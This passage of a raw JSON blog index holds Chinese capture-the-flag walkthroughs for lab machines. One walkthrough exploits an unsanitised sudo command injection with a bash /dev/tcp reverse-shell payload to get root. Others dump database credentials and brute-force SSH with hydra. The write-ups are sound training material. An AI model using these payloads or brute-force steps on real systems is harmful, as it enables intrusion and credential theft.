dynamic enp0s3\n       valid_lft 80142sec preferred_lft 80142sec\n    inet6 240e:33d:3d:28b1:a00:27ff:fefe:b75d/64 scope global dynamic mngtmpaddr \n       valid_lft 256115sec preferred_lft 169715sec\n    inet6 fe80::a00:27ff:fefe:b75d/64 scope link \n       valid_lft forever preferred_lft forever\n\n[\u2192] Sending: ps aux | head -10\n[\u2190] Response received (795 bytes)\n\n=== ps aux | head -10 ===\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.5  98848 10236 ?        Ss   00:23   0:00 /sbin/init\nroot           2  0.0  0.0      0     0 ?        S    00:23   0:00 [kthreadd]\nroot           3  0.0  0.0      0     0 ?        I<   00:23   0:00 [rcu_gp]\nroot           4  0.0  0.0      0     0 ?        I<   00:23   0:00 [rcu_par_gp]\nroot           6  0.0  0.0      0     0 ?        I<   00:23   0:00 [kworker/0:0H-kblockd]\nroot           8  0.0  0.0      0     0 ?        I<   00:23   0:00 [mm_percpu_wq]\nroot           9  0.0  0.0      0     0 ?        S    00:23   0:00 [ksoftirqd/0]\nroot          10  0.0  0.0      0     0 ?        I    00:23   0:00 [rcu_sched]\nroot          11  0.0  0.0      0     0 ?        I    00:23   0:00 [rcu_bh]\n\n[*] Starting interactive ICMP shell (type 'exit' to quit)\nicmp-shell>\n```\n### shell\u4f18\u5316\n\n\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# nc -lvvp 2332                    \nlistening on [any] 2332 ...\n192.168.2.5: inverse host lookup failed: Unknown host\nconnect to [192.168.2.5] from (UNKNOWN) [192.168.2.5] 33456\nbash: cannot set terminal process group (341): Inappropriate ioctl for device\nbash: no job control in this shell\nzero@BabyShell:/$ python3 -c 'import pty;pty.spawn('/bin/bash')'\npython3 -c 'import pty;pty.spawn('/bin/bash')'\nzero@BabyShell:/$ export SHELL=/bin/bash\nexport SHELL=/bin/bash\nzero@BabyShell:/$ export TERM=xterm-256color\nexport TERM=xterm-256color\nzero@BabyShell:/$ ^Z\nzsh: suspended  nc -lvvp 2332\n                                                                                                              \n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# stty -a             \nspeed 38400 baud; rows 24; columns 110; line = 0;\nintr = ^C; quit = ^\\; erase = ^H; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>;\nstart = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;\n-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts\n-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl -ixon -ixoff -iuclc -ixany -imaxbel iutf8\nopost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0\nisig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc\n\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# stty raw -echo;fg\n[1]  + continued  nc -lvvp 2332\n                               reset\n\n```\n\n## 3.root\n\nopt\u4e0b\u53d1\u73b0\u5b8c\u6574icmp\u670d\u52a1\u7aef\u6e90\u7801\uff0c\u5177\u4f53\u5173\u6ce8execute_command_as_user\u51fd\u6570\u5185\u5bb9\n```\ndef execute_command_as_user(self, command, uid=1000, timeout=30):\n        try:\n            # \u4f7f\u7528sudo\u4ee5\u6307\u5b9a\u7528\u6237\u6267\u884c\u547d\u4ee4\n            result = subprocess.check_output(\n                f'sudo -u zero bash -c '{command}'',\n                shell=True,\n                stderr=subprocess.STDOUT,\n                timeout=timeout,\n                text=True\n            )\n            return result\n        except subprocess.TimeoutExpired:\n            return f'Error: Command timeout'\n        except subprocess.CalledProcessError as e:\n            return f'Error: Exit code {e.returncode}\\nOutput: {e.output}'\n        except Exception as e:\n            return f'Error: {str(e)}'\n            \n```\n```\n\u53ef\u4ee5\u770b\u5230f'sudo -u zero bash -c '{command}''\u662froot\u6267\u884c\u7684\u800c\u4e14\u6ca1\u6709\u8fc7\u6ee4\uff0c\u90a3\u5c31\u76f4\u63a5\u62fc\u63a5\u62ffshell\u5c31\u884c\n\u4f20\u5165command ';whoami'\n\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# python3 ez.py 192.168.2.9\n[*] Testing connection to 192.168.2.9...\n[\u2192] Sending: ';whoami'\n[\u2190] Response received (5 bytes)\n[+] Backdoor active! Current user: root\n```\n\u80fd\u6210\u529f\u6267\u884c\u90a3\u5c31\u5f00\u59cb\u53cd\u5f39shell\n\n\u53cd\u5f39\u62a5\u9519fd\u7684\u53ef\u4ee5\u770b\u8fd9\u4e2a\u535a\u5ba2\n[\u89e3\u51b3ubuntu crontab\u53cd\u5f39shell\u5931\u8d25\u7684\u95ee\u9898 | m3lon](https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/)\n\n`payload:';bash -c 'bash -i  >&/dev/tcp/192.168.2.5/2333 0>&1''`\n\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# python3 exp.py 192.168.2.9         \n[*] Testing connection to 192.168.2.9...\n[\u2192] Sending: ';bash -c 'bash -i  >&/dev/tcp/192.168.2.5/2333 0>&1''\n[\u2190] Response received (54 bytes)\n[+] Backdoor active! Current user: ';bash -c 'bash -i  >&/dev/tcp/192.168.2.5/2333 0>&1''\n\n\n\u250c\u2500\u2500(root\u327fkali)-[~]\n\u2514\u2500# nc -lvvp 2333\nlistening on [any] 2333 ...\n192.168.2.5: inverse host lookup failed: Unknown host\nconnect to [192.168.2.5] from (UNKNOWN) [192.168.2.5] 42254\nbash: cannot set terminal process group (341): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@BabyShell:/# \n\n```\n\u63a5\u5230root shell\u3002", "top": 0, "createdAt": 1762771089, "style": "", "script": "", "head": "", "ogImage": "https://avatars.githubusercontent.com/u/99706997?v=4", "createdDate": "2025-11-10", "dateLabelColor": "#0969da"}, "P4": {"htmlDir": "docs/post/BabyCms-MJ.html", "labels": ["WP"], "postTitle": "BabyCms-MJ", "postUrl": "post/BabyCms-MJ.html", "postSourceUrl": "https://github.com/faabbi/faabbi.github.io/issues/4", "commentNum": 0, "wordCount": 11622, "description": "# 1.\u4fe1\u606f\u6536\u96c6\n\t\n\u5e38\u89c4\u626b\u63cf\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# nmap --min-rate 10000 -p- 192.168.2.54\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 05:50 EST\nNmap scan report for babycms.dsz (192.168.2.54)\nHost is up (0.00011s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:66:9E:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 4.55 seconds\n                                                                                                     \n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# nmap -sV -sC -O -p22,80 192.168.2.54  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 05:50 EST\nNmap scan report for babycms.dsz (192.168.2.54)\nHost is up (0.00027s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey: \n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-generator: Typecho 1.3.0\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: Hello World\nMAC Address: 08:00:27:66:9E:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.37 seconds\n```\n\u9776\u673a\u5f00\u653e\u5e38\u89c422\u7aef\u53e3\u548c80\u7aef\u53e3\n\n\u7ee7\u7eed\u6536\u96c6udp\u7aef\u53e3\u60c5\u51b5\uff0c\u6709\u4e9b\u670d\u52a1\u53ef\u80fd\u5f00\u653e\uff0c\u4f18\u5148\u505atcp\u7684\u6e17\u900f\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# nmap -sU --top-ports 20 192.168.2.54\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 05:53 EST\nNmap scan report for babycms.dsz (192.168.2.54)\nHost is up (0.00042s latency).\n\nPORT      STATE         SERVICE\n53/udp    closed        domain\n67/udp    open|filtered dhcps\n68/udp    open|filtered dhcpc\n69/udp    closed        tftp\n123/udp   open|filtered ntp\n135/udp   open|filtered msrpc\n137/udp   closed        netbios-ns\n138/udp   open|filtered netbios-dgm\n139/udp   open|filtered netbios-ssn\n161/udp   open|filtered snmp\n162/udp   open|filtered snmptrap\n445/udp   closed        microsoft-ds\n500/udp   closed        isakmp\n514/udp   closed        syslog\n520/udp   closed        route\n631/udp   open|filtered ipp\n1434/udp  closed        ms-sql-m\n1900/udp  closed        upnp\n4500/udp  closed        nat-t-ike\n49152/udp closed        unknown\nMAC Address: 08:00:27:66:9E:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n## dirsearch\u76ee\u5f55\u626b\u63cf\u4ee5\u53cadirb\u6307\u5b9a\u6269\u5c55\u540d\u626b\u63cf\n\n\u91cd\u70b9\u5173\u6ce8admin\u9875\u9762\u4ee5\u53caconfig\u6587\u4ef6\uff0c\u53ef\u4ee5\u7559\u610f\u540e\u7eed\u5229\u7528\u6570\u636e\u5e93\n\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# dirsearch -u http://192.168.2.54/\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460\n\nOutput File: /tmp/test/reports/http_192.168.2.54/__25-11-10_05-54-56.txt\n\nTarget: http://192.168.2.54/\n\n[05:54:56] Starting: \n[05:55:06] 302 -    0B  - /admin/  ->  http://192.168.2.54/admin/login.php?referer=http%3A%2F%2F192.168.2.54%2Fadmin%2F\n[05:55:07] 302 -    0B  - /admin/index.php  ->  http://192.168.2.54/admin/login.php?referer=http%3A%2F%2F192.168.2.54%2Fadmin%2Findex.php\n[05:55:07] 200 -    2KB - /admin/login.php                                  \n[05:55:18] 200 -    0B  - /config.inc.php                          \n\n\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# dirb http://babycms.dsz/ -X .txt,.php,.zip\n\n%% \u6211\u8fd9\u91cc\u8bbe\u7f6e\u4e86host\u57df\u540d\uff0c\u4e0d\u7136\u53d1\u73b0\u9996\u9875\u4f1a\u5d29\u6e83 %%\n-----------------\nDIRB v2.22    \nBy The Dark Raver\n-----------------\n\nSTART_TIME: Mon Nov 10 05:58:06 2025\nURL_BASE: http://babycms.dsz/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\nEXTENSIONS_LIST: (.txt,.php,.zip) | (.txt)(.php)(.zip) [NUM = 3]\n\n-----------------\n\nGENERATED WORDS: 4612                                                        \n\n---- Scanning URL: http://babycms.dsz/ ----                                                                                    + http://babycms.dsz/index.php (CODE:200|SIZE:10135)                                                \n+ http://babycms.dsz/install.php (CODE:302|SIZE:0)                                                  \n+ http://babycms.dsz/LICENSE.txt (CODE:200|SIZE:14974)                                              \n+ http://babycms.dsz/setup.txt (CODE:200|SIZE:26)                        \n```\n\n\u5bc6\u7801\u51ed\u636e\n```\nsetup.txt\npass:dyxBCEjovrUJa84sV03Q\n```\n\u9996\u9875\u53d1\u73b0\u7528\u6237\u540droot\n![[Pasted image 20251110190322.png]]\n# 2.Web\u6e17\u900f\n\n\u7f16\u8f91\u4e00\u4e0bphp\u6587\u4ef6\u5f39shell\n![[Pasted image 20251110190640.png]]\n\u63a5\u6536\u5230\u53cd\u5f39shell\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# nc -lvvp 2332                       \nlistening on [any] 2332 ...\n192.168.2.55: inverse host lookup failed: Unknown host\nconnect to [192.168.2.55] from (UNKNOWN) [192.168.2.55] 57370\nbash: cannot set terminal process group (468): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@BabyCMS:/var/www/html$ \n```\n## shell\u4f18\u5316\n\u53c2\u8003[link-MJ](https://faabbi.github.io/post/link-MJ.html)\n\n# 3.caigou\n\n## \u6570\u636e\u5e93\u83b7\u53d6\u51ed\u636e\n\n\n\u5728config.inc.php\u6587\u4ef6\u4e2d\u5f97\u5230\u6570\u636e\u5e93\u51ed\u636e\n\n```\n  'user' => 'pagekit_user',\n  'password' => 'your_secure_password',\n```\n\n\u5c1d\u8bd5mysql\u8fde\u63a5\u6570\u636e\u5e93\u83b7\u53d6\u7528\u6237\u51ed\u636e\n```\nwww-data@BabyCMS:/$ mysql -upagekit_user -p\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 54225\nServer version: 10.5.23-MariaDB-0+deb11u1 Debian 11\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| pagekit            |\n+--------------------+\n2 rows in set (0.000 sec)\n\nMariaDB [(none)]> use pagekit;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nMariaDB [pagekit]> show tables;\n+-----------------------+\n| Tables_in_pagekit     |\n+-----------------------+\n| typecho_comments      |\n| typecho_contents      |\n| typecho_fields        |\n| typecho_metas         |\n| typecho_options       |\n| typecho_relationships |\n| typecho_userlist      |\n| typecho_users         |\n+-----------------------+\n8 rows in set (0.000 sec)\n\nMariaDB [pagekit]> select * from typecho_userlist;\n+----+--------+----------------------+\n| id | name   | pass                 |\n+----+--------+----------------------+\n|  1 | caigou | dRfGtYhUjIkOlPqAeRtY |\n|  2 | user1  | aBcDeFgHiJkLmNoPqRsT |\n|  3 | user2  | cNNloFLE88YBIP4ZJfcy |\n|  4 | user3  | xYzAbCdEfGhIjKlMnOpQ |\n|  5 | user4  | pLmOkNjIbHvGcFxDrEsW |\n|  6 | user5  | wVxYzAbCdEfGhIjKlMnO |\n|  7 | user6  | sTrUvWxYzAbCdEfGhIjK |\n|  8 | user7  | qWeRtYuIoPaSdFgHjKlZ |\n|  9 | user8  | mNbVcXzAsDfGhJkLpOqR |\n| 10 | user9  | kJiHgFdSaPqOwNeMtBuV |\n+----+--------+----------------------+\n10 rows in set (0.000 sec)\n\nMariaDB [pagekit]> select * from typecho_users;\n+-----+------+------------------------------------+---------------+--------------------+------------+------------+------------+------------+---------------+----------------------------------+\n| uid | name | password                           | mail          | url                | screenName | created    | activated  | logged     | group         | authCode                         |\n+-----+------+------------------------------------+---------------+--------------------+------------+------------+------------+------------+---------------+----------------------------------+\n|   1 | root | $P$BPa7rmHlGmug8IJn5dLOBqwB3jvRRt. | root@root.com | http://babycms.dsz | root       | 1762657463 | 1762772820 | 1762760703 | administrator | 9e100148e8b035c1f3c5fb568b856d79 |\n+-----+------+------------------------------------+---------------+--------------------+------------+------------+------------+------------+---------------+----------------------------------+\n1 row in set (0.000 sec)\n```\n\u6709\u65f6\u5019\u67e5\u5e93\u5c31\u4f1a\u6709\u8fd9\u79cd\u60c5\u51b5\uff0c\u50cf\u662f\u7ec8\u7aef\u5927\u5c0f\u95ee\u9898\uff0c\u52c9\u5f3a\u80fd\u5f00\uff0c\u6b22\u8fce\u4f6c\u6307\u5bfc\u4e00\u4e0b\n\n## \u6570\u636e\u5904\u7406\u4ee5\u53cassh\u7206\u7834\n\u53d1\u73b0\u51e0\u7ec4\u51ed\u636e\uff0c\u4ee5\u53caphpass\u52a0\u5bc6\u7684hash\uff0c\u5c1d\u8bd5\u5bf9\u5e94\u51ed\u636e\u767b\u5f55\u4e0d\u6210\u529f\uff0c\u8003\u8651\u53ef\u80fd\u4e71\u5e8f\uff0c\u5728\u5bb6\u76ee\u5f55\u4e0b\u786e\u5b9a\u5b58\u5728caigou\u7528\u6237\uff0c\u53ef\u4ee5\u5c1d\u8bd5hydra\u8dd1\u4e00\u4e0bssh\n\n\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# cat info | awk -F '|' '{print $4}' | awk -F ' ' '{print $1}' > pass\n                                                                                                              \n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# cat pass                                                           \ndRfGtYhUjIkOlPqAeRtY\naBcDeFgHiJkLmNoPqRsT\ncNNloFLE88YBIP4ZJfcy\nxYzAbCdEfGhIjKlMnOpQ\npLmOkNjIbHvGcFxDrEsW\nwVxYzAbCdEfGhIjKlMnO\nsTrUvWxYzAbCdEfGhIjK\nqWeRtYuIoPaSdFgHjKlZ\nmNbVcXzAsDfGhJkLpOqR\nkJiHgFdSaPqOwNeMtBuV\n\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# hydra -l caigou -P pass -s 22 192.168.2.54 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-10 06:23:23\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 11 tasks per 1 server, overall 11 tasks, 11 login tries (l:1/p:11), ~1 try per task\n[DATA] attacking ssh://192.168.2.54:22/\n[22][ssh] host: 192.168.2.54   login: caigou   password: cNNloFLE88YBIP4ZJfcy\n1 of 1 target successfully completed, 1 valid password found\n[WARNING] Writing restore file because 1 final worker threads did not complete until end.\n[ERROR] 1 target did not resolve or could not be connected\n[ERROR] 0 target did not complete\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-10 06:23:26\n\n```\n\u8dd1\u51facaigou\u5bc6\u7801   cNNloFLE88YBIP4ZJfcy\n\n## user.txt\n\n```\ncaigou@BabyCMS:~$ cat /home/caigou/user.txt \nflag{user-02dc7f9da20474707eb298cde17eb7dd}\n```\n\n# 4.root\n\n## \u5bc6\u7801\u590d\u7528\n\u62ff\u5230caigou\u540e\u5e76\u6ca1\u6709\u53d1\u73b0\u5e38\u89c4\u63d0\u6743\u8def\u5f84\u53ef\u7528\uff0c\u800c\u4e14phpass hash\u5e76\u672a\u7834\u89e3\u51fa\u6765\uff0c\u5c1d\u8bd5\u4f7f\u7528\u5bc6\u7801\u7ee7\u7eed\u8dd1root\u7684ssh\n\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# hydra -l root -P pass -s 22 192.168.2.54 ssh  \nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-10 06:26:26\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 11 tasks per 1 server, overall 11 tasks, 11 login tries (l:1/p:11), ~1 try per task\n[DATA] attacking ssh://192.168.2.54:22/\n[22][ssh] host: 192.168.2.54   login: root   password: cNNloFLE88YBIP4ZJfcy\n1 of 1 target successfully completed, 1 valid password found\n[WARNING] Writing restore file because 1 final worker threads did not complete until end.\n[ERROR] 1 target did not resolve or could not be connected\n[ERROR] 0 target did not complete\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-10 06:26:30\n\n```\n\u548ccaigou\u4e00\u4e2a\u5bc6\u7801\n\n## root.txt\n\n```\nroot@BabyCMS:~# cat /root/root.txt \nflag{root-74cc1c60799e0a786ac7094b532f01b1}\n```\n\n\n\n\u3002", "top": 0, "createdAt": 1762837036, "style": "", "script": "", "head": "", "ogImage": "https://avatars.githubusercontent.com/u/99706997?v=4", "createdDate": "2025-11-11", "dateLabelColor": "#0969da"}, "P5": {"htmlDir": "docs/post/BabyPass-MJ.html", "labels": ["WP"], "postTitle": "BabyPass-MJ", "postUrl": "post/BabyPass-MJ.html", "postSourceUrl": "https://github.com/faabbi/faabbi.github.io/issues/5", "commentNum": 0, "wordCount": 10865, "description": "# 1.\u4fe1\u606f\u6536\u96c6\n\n## \u521d\u6b65\u4fe1\u606f\u63a2\u6d4b\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# nmap --min-rate 10000 -p- 192.168.2.58\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 06:09 EST\nNmap scan report for 192.168.2.58\nHost is up (0.00056s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:0A:76:0B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 9.05 seconds\n                                                                                          \n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# nmap -sV -sC -O -p22,80 192.168.2.58  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 06:09 EST\nNmap scan report for 192.168.2.58\nHost is up (0.00029s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey: \n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Apache/2.4.62 (Debian)\nMAC Address: 08:00:27:0A:76:0B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 14.59 seconds\n                                                                                          \n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# nmap --script=vuln -p22,80 192.168.2.58\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 06:10 EST\nNmap scan report for 192.168.2.58\nHost is up (0.00020s latency).\n\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n|_http-csrf: Couldn't find any CSRF vulnerabilities.\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\n|_http-dombased-xss: Couldn't find any DOM based XSS.\nMAC Address: 08:00:27:0A:76:0B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 37.39 seconds\n\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# nmap -sU --top-ports 20 192.168.2.58   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 06:10 EST\nNmap scan report for 192.168.2.58\nHost is up (0.00048s latency).\n\nPORT      STATE         SERVICE\n53/udp    closed        domain\n67/udp    open|filtered dhcps\n68/udp    open|filtered dhcpc\n69/udp    open|filtered tftp\n123/udp   closed        ntp\n135/udp   closed        msrpc\n137/udp   closed        netbios-ns\n138/udp   closed        netbios-dgm\n139/udp   closed        netbios-ssn\n161/udp   open|filtered snmp\n162/udp   closed        snmptrap\n445/udp   open|filtered microsoft-ds\n500/udp   open|filtered isakmp\n514/udp   open|filtered syslog\n520/udp   open|filtered route\n631/udp   closed        ipp\n1434/udp  closed        ms-sql-m\n1900/udp  open|filtered upnp\n4500/udp  closed        nat-t-ike\n49152/udp closed        unknown\nMAC Address: 08:00:27:0A:76:0B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 14.51 seconds\n```\n\u5f00\u653e22\uff0c80\u7aef\u53e3\uff0cudp\u53d1\u73b0tftp\u53ef\u80fd\u5f00\u653e\uff0cudp\u534f\u8bae\u7aef\u53e3\u4e0d\u597d\u505a\u626b\u63cf\uff0c\u5927\u591a\u626b\u63cf\u5e76\u4e0d\u51c6\u786e\uff0c\u4e14\u6bcf\u6b21\u626b\u63cf\u7ed3\u679c\u5927\u6982\u7387\u4e0d\u76f8\u540c\n\n## web\u4fe1\u606f\u6536\u96c6\n\ncurl\u4e00\u4e0bweb\u53d1\u73b0\u9690\u85cf\u4fe1\u606f\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# curl http://192.168.2.58/    \nhello world\n<!-- tms -->\n<!-- Do not use same password in different account.  -->\n```\n\u76ee\u5f55\u7206\u7834\uff0c\u53d1\u73b0\u90e8\u5206\u6709\u7528\u4fe1\u606f\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# dirsearch -u http://192.168.2.58/tms/\nTarget: http://192.168.2.58/\n\n[06:14:40] Starting: tms/\n[06:14:41] 301 -  313B  - /tms/js  ->  http://192.168.2.58/tms/js/                 [06:14:48] 301 -  316B  - /tms/admin  ->  http://192.168.2.58/tms/admin/    \n[06:14:49] 200 -  820B  - /tms/admin/                                       \n[06:14:49] 200 -  820B  - /tms/admin/index.php                              \n[06:15:01] 301 -  314B  - /tms/css  ->  http://192.168.2.58/tms/css/        \n[06:15:05] 301 -  316B  - /tms/fonts  ->  http://192.168.2.58/tms/fonts/    \n[06:15:07] 301 -  317B  - /tms/images  ->  http://192.168.2.58/tms/images/  \n[06:15:08] 200 -  820B  - /tms/images/                                      \n[06:15:08] 301 -  319B  - /tms/includes  ->  http://192.168.2.58/tms/includes/\n[06:15:08] 200 -  551B  - /tms/includes/                                    \n[06:15:08] 200 -    4KB - /tms/index.php                                    \n[06:15:09] 200 -    4KB - /tms/index.php/login/                             \n[06:15:10] 200 -  516B  - /tms/js/                                          \n[06:15:12] 302 -    1B  - /tms/logout.php  ->  index.php                    \n[06:15:16] 200 -    3KB - /tms/page.php                                     \n[06:15:21] 302 -    0B  - /tms/profile.php  ->  index.php                   \n[06:15:22] 200 -    2KB - /tms/README.md                                    \n[06:15:22] 200 -  336B  - /tms/Readme.txt                                   \n[06:15:30] 200 -    3KB - /tms/thankyou.php\n```\n\u654f\u611f\u6587\u4ef6\u53d1\u73b0\u53ef\u80fd\u7684\u5bc6\u7801\n```\n\u250c\u2500\u2500(root\u327fkali)-[/tmp/test]\n\u2514\u2500# curl http://192.168.2.58/tms/Readme.txt\nInstallation Steps(Configuration)\n1. Download and Unzip file on your local system.\n2.Copy tms folder and tms folder inside root directory (for xampp xampp/htdocs, for wamp wamp/www, for lamp var/www/html)\n\nDatabase Configuration\n\nOpen phpmyadmin\nCreate Database tms\nImport database tms.sql (available inside zip package)\nOpen Your browser put inside browser \ufffdhttp://localhost/tms\ufffd\n\nLogin Details for admin : \nOpen Your browser put inside browser \ufffdhttp://localhost/tms/admin\ufffd\nUsername : admin\nPassword : Test@123\n\nLogin Details for user: \nOpen Your browser put inside browser \ufffdhttp://localhost/tms/\ufffd\nUsername : anuj@gmail.com\nPassword : 